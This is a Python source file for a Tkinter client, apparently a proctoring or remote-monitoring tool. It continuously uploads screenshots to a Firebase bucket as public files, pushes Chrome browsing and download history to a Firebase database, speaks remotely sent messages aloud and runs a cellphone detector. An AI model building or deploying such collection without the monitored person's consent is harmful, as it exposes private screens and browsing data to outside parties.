import threading
import time
import tkinter as tk
from modules.read_screen import capture
from modules.speak_message import speak
from modules.history_browser import get_chrome_history
from modules.get_id_device import get_id
import firebase_admin
from firebase_admin import credentials, storage, db
import uuid
from modules.cellphones_detection import detect_cellphones
# Khởi tạo Firebase

cred = credentials.Certificate("key.json")

firebase_admin.initialize_app(
    cred,
    {
        "databaseURL": "https://fashionapp-49789-default-rtdb.firebaseio.com",
        "storageBucket": "fashionapp-49789.appspot.com",
    },
)
bucket = storage.bucket()
id = get_id()

# Giao diện chính
root = tk.Tk()
root.title("Firebase App")
root.geometry("400x300")

# Hiển thị ID
id_label = tk.Label(root, text=f"Device ID: {id}", font=("Arial", 14))
id_label.pack(pady=20)

status_label = tk.Label(root, text="Status: Waiting...", font=("Arial", 12))
status_label.pack(pady=20)
count = 0

# Các hàm xử lý Firebase
def push_capture_screen():
    global count
    while True:
        try:
            count+=1
            filePath = capture()
            file_blob = uuid.uuid4().hex
            blob = bucket.blob(id + "/screen/" + file_blob+'.png')
            blob.upload_from_filename(filePath)
            blob.make_public()
            file_url = blob.public_url
            db.reference(id).child("screen").set(file_url)
            status_label.config(text=f"Screen captured: {filePath}")
            if count == 30:
                blobs = bucket.list_blobs(prefix=id + "/screen/")
                for blob in blobs:
                    blob.delete()
        except Exception as e:
            status_label.config(text=f"Error: {e}")
        time.sleep(0.03)  # 30ms


def push_chrome_history():
    while True:
        try:
            list_history, list_downloads = get_chrome_history()
            db.reference(id).child("history").set(list_history)
            db.reference(id).child("download").set(list_downloads)
            status_label.config(text="Chrome history pushed.")
        except Exception as e:
            status_label.config(text=f"Error: {e}")
        time.sleep(60)  # 1 phút


def speak_message():
    while True:
        try:
            value = db.reference(id).child("message").get()
            if value:
                speak(value)
                db.reference(id).child("message").delete()
                status_label.config(text=f"Message spoken: {value}")
            else:
                status_label.config(text="No message to speak.")
        except Exception as e:
            status_label.config(text=f"Error: {e}")
        time.sleep(3)  # 1 giây

def tracking():
    detect_cellphones(bucket,db,id)

# Khởi động các luồng
threading.Thread(target=push_capture_screen, daemon=True).start()
threading.Thread(target=push_chrome_history, daemon=True).start()
threading.Thread(target=speak_message, daemon=True).start()
threading.Thread(target=tracking, daemon=True).start()
# Khởi động giao diện
root.mainloop()
